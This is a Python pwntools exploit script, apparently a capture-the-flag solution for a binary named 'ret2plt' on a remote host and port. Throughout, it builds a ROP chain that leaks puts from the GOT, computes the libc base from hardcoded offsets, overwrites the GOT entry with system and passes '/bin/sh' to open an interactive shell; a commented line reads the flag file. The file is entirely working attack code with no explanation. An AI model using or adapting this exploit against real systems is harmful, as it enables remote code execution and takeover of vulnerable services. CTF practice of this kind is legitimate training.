#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './ret2plt'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2125

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

pop_rdi_ret = 0x00000000004006f3
pop_rsi_pop_r15_ret = 0x00000000004006f1
read_in_main = 0x400672
binsh = 0x601060
ROP = flat(
    pop_rdi_ret,
    e.got['puts'],
    e.symbols['puts'], # print libc address
    pop_rdi_ret,
    e.got['puts'],
    e.symbols['gets'], # overwrite libc addr
    pop_rdi_ret,
    e.got['puts'] + 8,
    e.symbols['puts'],
)

r.sendline(b'A'*0x28 + ROP)
r.recvuntil('boom !\n')

puts_offset = 0x6f690 # remote
#puts_offset = 0x875a0 #local
system_offset = 0x45390 # remote
#system_offset = 0x55410 # local

libc_base = u64(r.recv(6) + b'\x00\x00') - puts_offset
system_addr = libc_base + system_offset

log.info(f'system_addr = {hex(system_addr)}')
input()
r.sendline(p64(system_addr) + b"/bin/sh\x00\x00")
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
